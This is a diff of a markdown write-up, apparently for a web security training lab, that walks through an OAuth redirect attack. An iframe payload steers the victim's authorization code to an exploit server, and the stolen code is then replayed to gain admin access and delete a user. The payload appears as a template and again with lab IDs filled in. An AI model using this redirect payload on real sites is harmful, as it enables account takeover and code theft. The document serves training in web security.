@@ -9,21 +9,23 @@
 ## You can log in with your own social media account using the following credentials: `wiener:peter`.
 
 ### HINT:
+
 ```javascript
 <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
+
+---
 
 step 1
 it will use as payload Hint and marked are same
 ![[lab3_http_histroy_auth.png]]
 
-
 ![[lab3_code_generated.png]]
 
-
-
 step 2
-send step 1 to repeater 
+send **\_\_\_\_**
+
+step 1 to repeater
 302 found
 and ready for payload
 
@@ -31,13 +33,13 @@ and ready for payload
 
 step 3
 add payload
+
 ```javascript
 <iframe src="https://oauth-0a32008e030e1bbe82ab688d02d00091.oauth-server.net/auth?client_id=m1rm32vafm9mw7sif225q&redirect_uri=https://exploit-0a92008803f01bcc822269b801a40040.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
 ```
 
 store and view exploit
 ![[lab3_add_payload_exploit.png]]
-
 
 click exploit deliver to victim
 and click on access log
@@ -52,12 +54,10 @@ copy code replace and forward request
 
 ![[lab3_intercept_login_replace_code.png]]
 
-
 step 7
 you will get admin panel
 
 ![[lab3_admin_panel.png]]
-
 
 delete carlos account solved lab
 
